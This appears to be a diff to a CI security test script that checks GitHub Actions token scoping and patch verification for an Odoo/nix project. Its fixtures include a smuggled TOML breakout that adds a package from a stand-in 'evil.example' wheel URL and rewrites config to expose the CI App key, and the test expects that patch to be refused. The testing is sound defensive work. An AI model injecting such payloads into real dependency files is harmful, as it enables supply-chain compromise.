@@ -12,8 +12,11 @@ runs its CLI, for the key jobs' patch checks.
   and none of them runs the repository's code (no nix, npm, yarn, node, git submodule).
 - The jobs that run the repository's code and fetch private submodules (odoo-test's test,
   odoo-deps' project-update-plan) take SUBMODULE_PRIVATE_KEY only, mint a contents:read
-  token with it, and refuse an App that can do more before any of that code runs.
+  token with it for the owner's submodule repositories GITHUB_TOKEN cannot read (none:
+  no token), and refuse an App that can do more before any of that code runs.
   odoo-test.yml declares no APP_PRIVATE_KEY, and the ci.yml template passes it none.
+  project-update, which runs none of it, mints the same read token to read the private
+  submodules' branch tips.
 - A job that calls a reusable workflow passes APP_PRIVATE_KEY, AVUNU_CI_PRIVATE_KEY or
   `secrets: inherit` only if it is allowlisted here.
 - In the key jobs, odoo-nix-tools comes from standards-install's `hardened` mode
@@ -25,9 +28,10 @@ runs its CLI, for the key jobs' patch checks.
   (`odoo-nix verify-patch relock`) before the token, and pushes without force; automerge
   recomputes `moved` with the same step, and reads whether relock-plan ran from its result;
   neither reads relock-plan's `moved`.
-- project-update checks out the base itself, stages the plan's patch in the index, runs
-  `odoo-nix verify-patch project-update` before the token, and pushes a new branch without
-  force.
+- project-update-plan runs on ubuntu-latest. project-update checks out the base itself,
+  stages the plan's patch in the index, runs `odoo-nix verify-patch project-update`, then
+  `--tips` (each moved submodule is its .gitmodules branch's tip, `git ls-remote`) before
+  the token, and pushes a new branch without force.
 - The patch checks are run here on accepted and refused patches (flake.lock, .gitmodules,
   workflows and lock content among the refused), the automerge relock-state step on its
   cases, and the jq `moved` program against standards_core's input_node.
@@ -69,6 +73,9 @@ INSTALLERS = {
 }
 # Run the repository's code; fetch private submodules with the read-only App only.
 SUBMODULE = {("odoo-test.yml", "test"), ("odoo-deps.yml", "project-update-plan")}
+# Hold the CI App's key, run none of the repository's code, and read the private
+# submodules' branch tips with the read-only App.
+SUBMODULE_TIPS = {("odoo-deps.yml", "project-update")}
 # Callers of a reusable workflow that may pass the CI App's key: python-devops-nix's
 # Dependabot workflows, whose jobs that hold it run on hosted runners and run no PR code.
 PASS_KEY = {
@@ -133,7 +140,11 @@ for path in sorted(WORKFLOWS.glob("*.yml")):
             continue
         main = any(k in text for k in MAIN_KEYS)
         sub = SUB_KEY in text
-        assert not (main and sub), (path.name, name, "both keys")
+        assert not (main and sub) or (path.name, name) in SUBMODULE_TIPS, (
+            path.name,
+            name,
+            "both keys",
+        )
         for s in job.get("steps", []):
             if "create-github-app-token" in s.get("uses", ""):
                 key = s["with"]["private-key"]
@@ -150,7 +161,7 @@ for path in sorted(WORKFLOWS.glob("*.yml")):
         if sub:
             sub_holders.add((path.name, name))
 assert main_holders == HARDENED, main_holders
-assert sub_holders == SUBMODULE, sub_holders
+assert sub_holders == SUBMODULE | SUBMODULE_TIPS, sub_holders
 
 # The submodule App: contents:read, and an App that can write refused before any code runs.
 for wf, name in SUBMODULE:
@@ -162,9 +173,16 @@ for wf, name in SUBMODULE:
     assert w["client-id"] == "${{ inputs.submodule-client-id }}", (wf, w)
     perms = {k: v for k, v in w.items() if k.startswith("permission-")}
     assert perms == {"permission-contents": "read"}, (wf, perms)
+    # Only the owner's repositories GITHUB_TOKEN cannot read: asking for one the App is
+    # not installed on is refused (HTTP 422), so a public one is never asked for.
+    repos = next(s for s in steps if s.get("id") == "repos")
+    assert w["repositories"] == "${{ steps.repos.outputs.repositories }}", (wf, w)
+    assert steps[t]["if"] == "steps.repos.outputs.repositories != ''", (wf, steps[t])
+    assert ".visibility" in repos["run"] and "!= public" in repos["run"], (wf, repos)
+    assert repos["env"]["GH_TOKEN"] == "${{ github.token }}", (wf, repos)
     refuse = steps[t + 1]
     assert refuse["name"] == REFUSE_NAME, (wf, refuse)
-    assert refuse["if"] == "steps.app.outputs.enabled == 'true'", (wf, refuse)
+    assert refuse["if"] == "steps.repos.outputs.repositories != ''", (wf, refuse)
     assert refuse["env"]["GH_TOKEN"] == "${{ steps.app-token.outputs.token }}", refuse
     assert REFUSE_JQ in refuse["run"], refuse["run"]
     assert "exit 1" in refuse["run"], refuse["run"]
@@ -348,6 +366,9 @@ assert relock_state("skipped", "", moved="odoo-nix") == ""
 
 # 3b. project-update-plan and project-update.
 pplan, pupd = deps["jobs"]["project-update-plan"], deps["jobs"]["project-update"]
+# Its patch is pushed and auto-merged: no shared self-hosted runner makes it.
+assert pplan["runs-on"] == "ubuntu-latest", pplan["runs-on"]
+assert "inputs.runs-on" not in json.dumps(deps["jobs"]), "a job on runs-on"
 assert pplan["permissions"] == {"contents": "read"}, pplan["permissions"]
 assert not any(k in json.dumps(pplan) for k in MAIN_KEYS), "project-update-plan's key"
 assert "odoo project update --no-sync" in json.dumps(pplan), "plan without --no-sync"
@@ -368,12 +389,32 @@ pcheck = index(
     ps,
     lambda s: s.get("name", "").startswith("Check and stage the project-update patch"),
 )
-assert same < pinstall < pcheck < token_at(ps), (same, pinstall, pcheck)
+ptips = index(ps, lambda s: "--tips" in s.get("run", ""))
+psub = index(ps, lambda s: s.get("id") == "sub-token")
+pmain = index(ps, lambda s: s.get("id") == "app-token")
+assert same < pinstall < pcheck < psub < ptips < pmain, (same, pinstall, pcheck, ptips)
+assert token_at(ps) == psub, "the read token is the first"
 assert pdownload < pcheck, (pdownload, pcheck)
 pscript = ps[pcheck]["run"]
 assert "git apply --cached" in pscript and "git apply --index" not in pscript, pscript
 assert "odoo-nix verify-patch project-update --base HEAD" in pscript, pscript
-assert ps[token_at(ps)]["with"]["repositories"] == "${{ github.event.repository.name }}"
+tscript = ps[ptips]["run"]
+assert (
+    "odoo-nix verify-patch project-update --base HEAD --tips"
+    ' --superproject-url "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY"'
+) in tscript, tscript
+assert "if" not in ps[ptips], ps[ptips]
+assert ps[ptips]["env"] == {
+    "TOKEN": "${{ steps.sub-token.outputs.token || github.token }}"
+}, ps[ptips]
+sw = ps[psub]["with"]
+assert sw["private-key"] == "${{ secrets.SUBMODULE_PRIVATE_KEY }}", sw
+assert sw["client-id"] == "${{ inputs.submodule-client-id }}", sw
+assert {k: v for k, v in sw.items() if k.startswith("permission-")} == {
+    "permission-contents": "read"
+}, sw
+assert ps[pmain]["with"]["private-key"] == "${{ secrets.APP_PRIVATE_KEY }}", ps[pmain]
+assert ps[pmain]["with"]["repositories"] == "${{ github.event.repository.name }}"
 ppushes = [s["run"] for s in ps if "git push" in s.get("run", "")]
 assert len(ppushes) == 1, ppushes
 assert '"HEAD:refs/heads/$branch"' in ppushes[0], ppushes[0]
@@ -555,6 +596,24 @@ UVLOCK = (
     + f'sdist = {{ url = "{FILES}/babel-2.17.0.tar.gz", hash = "sha256:11" }}\n'.encode()
 )
 
+# The install set's array closed, and tables of its own after it: the repository's
+# standards config (the CI App's key as the submodule App, auto-merge-policy "all").
+BREAKOUT = (
+    b'    "odoo",\n'
+    b'    "evil @ https://evil.example/evil-1.0-py3-none-any.whl",\n'
+    b"]\n"
+    b"[tool.odoo-nix.ci.submodule-app]\n"
+    b'app-id = "AVUNU_CI_APP_ID"\n'
+    b'private-key = "AVUNU_CI_PRIVATE_KEY"\n'
+    b"[tool.odoo-nix.dependabot]\n"
+    b'auto-merge-policy = "all"\n'
+    b"[tool.zz]\n"
+    b"x = [\n"
+)
+BREAKOUT_PLAIN = BREAKOUT.replace(
+    b'    "evil @ https://evil.example/evil-1.0-py3-none-any.whl",\n', b""
+)
+
 
 def relock_push(change) -> int:
     """relock-push's patch check, then its verify-patch step, on `change(repo)`."""
@@ -622,6 +681,12 @@ content_refused = {
         b'    "odoo",\n',
         b'    "odoo",\n    "x @ https://e.example/x.whl",\n',
     ),
+    "the install set breaking out": edit(
+        "nix/pyproject.toml", b'    "odoo",\n', BREAKOUT
+    ),
+    "the install set breaking out, no URL": edit(
+        "nix/pyproject.toml", b'    "odoo",\n', BREAKOUT_PLAIN
+    ),
     "a git source": new_package(
         "x", f"{FILES}/x-1.0.tar.gz", '{ git = "https://e.example/x" }'
     ),
@@ -637,18 +702,35 @@ for why, change in content_refused.items():
     assert relock_push(change) != 0, why
 
 
-def project_update(change) -> int:
-    """project-update's check-and-stage step on the patch `change(repo)` stages."""
+# The submodule's remote: https://github.com/OCA/web is read from a local bare repository
+# (git's url.<base>.insteadOf, in a global config of the test's own), whose 18.0 is TIP.
+REMOTES = tempfile.mkdtemp()
+g(REMOTES, "init", "-q", "--bare", "OCA/web")
+g(REMOTES, "clone", "-q", "OCA/web", "work")
+g(os.path.join(REMOTES, "work"), "commit", "-q", "--allow-empty", "-m", "tip")
+g(os.path.join(REMOTES, "work"), "push", "-q", "origin", "HEAD:refs/heads/18.0")
+TIP = g(os.path.join(REMOTES, "work"), "rev-parse", "HEAD").strip()
+GITCONFIG = os.path.join(REMOTES, "gitconfig")
+Path(GITCONFIG).write_text(
+    f'[url "file://{REMOTES}/"]\n\tinsteadOf = https://github.com/\n'
+    "[protocol]\n\tallow = always\n"
+)
+
+
+def project_update(change, plan=PYPROJECT) -> int:
+    """project-update's check-and-stage step, then its tips step, on the patch
+    `change(repo)` stages; `plan` is the base's pyproject.toml."""
     with tempfile.TemporaryDirectory() as tmp:
         src, dst = os.path.join(tmp, "src"), os.path.join(tmp, "dst")
         os.makedirs(src)
         g(src, "init", "-q")
-        write(src, "pyproject.toml", PYPROJECT)
+        write(src, "pyproject.toml", plan)
         write(src, "uv.lock", UVLOCK)
         write(
             src,
             ".gitmodules",
-            b'[submodule "web"]\n\tpath = modules/web\n\turl = https://github.com/OCA/web\n',
+            b'[submodule "web"]\n\tpath = modules/web\n'
+            b"\turl = https://github.com/OCA/web\n\tbranch = 18.0\n",
         )
         write(src, ".github/workflows/ci.yml", b"name: ci\n")
         g(src, "add", "-A")
@@ -658,10 +740,22 @@ def project_update(change) -> int:
         change(src)
         patch = os.path.join(tmp, "x.patch")
         Path(patch).write_text(g(src, "diff", "--cached", "--binary", "HEAD"))
-        env = {**WITH_TOOLS, "PATCH": patch, "RUNNER_TEMP": tmp}
-        return subprocess.run(
-            ["bash", "-c", pscript], check=False, cwd=dst, env=env
-        ).returncode
+        env = {
+            **WITH_TOOLS,
+            "PATCH": patch,
+            "RUNNER_TEMP": tmp,
+            "TOKEN": "t",
+            "GIT_CONFIG_GLOBAL": GITCONFIG,
+            "GITHUB_SERVER_URL": "https://github.com",
+            "GITHUB_REPOSITORY": "acme/project",
+        }
+        for run in (pscript, tscript):
+            code = subprocess.run(
+                ["bash", "-c", run], check=False, cwd=dst, env=env
+            ).returncode
+            if code:
+                return code
+        return 0
 
 
 def gitlink(path, sha):
@@ -683,13 +777,11 @@ def project_edit(path, old, new):
     return edit(path, old, new)
 
 
-assert project_update(staged(gitlink("modules/web", "2" * 40))) == 0, (
-    "a submodule moved"
-)
+assert project_update(staged(gitlink("modules/web", TIP))) == 0, "a submodule moved"
 assert (
     project_update(
         staged(
-            gitlink("modules/web", "2" * 40),
+            gitlink("modules/web", TIP),
             project_edit(
                 "pyproject.toml", b'    "odoo",\n', b'    "odoo",\n    "idna",\n'
             ),
@@ -699,9 +791,18 @@ assert (
 ), "a submodule moved and relocked"
 project_refused = {
     "nothing": staged(),
+    "a commit that is not the branch's tip": staged(gitlink("modules/web", "2" * 40)),
+    "the install set breaking out": staged(
+        gitlink("modules/web", TIP),
+        project_edit("pyproject.toml", b'    "odoo",\n', BREAKOUT),
+    ),
+    "the install set breaking out, no URL": staged(
+        gitlink("modules/web", TIP),
+        project_edit("pyproject.toml", b'    "odoo",\n', BREAKOUT_PLAIN),
+    ),
     "a new submodule": staged(gitlink("modules/evil", "3" * 40)),
     ".gitmodules": staged(
-        gitlink("modules/web", "2" * 40),
+        gitlink("modules/web", TIP),
         project_edit(
             ".gitmodules", b"https://github.com/OCA/web", b"https://e.example/web"
         ),
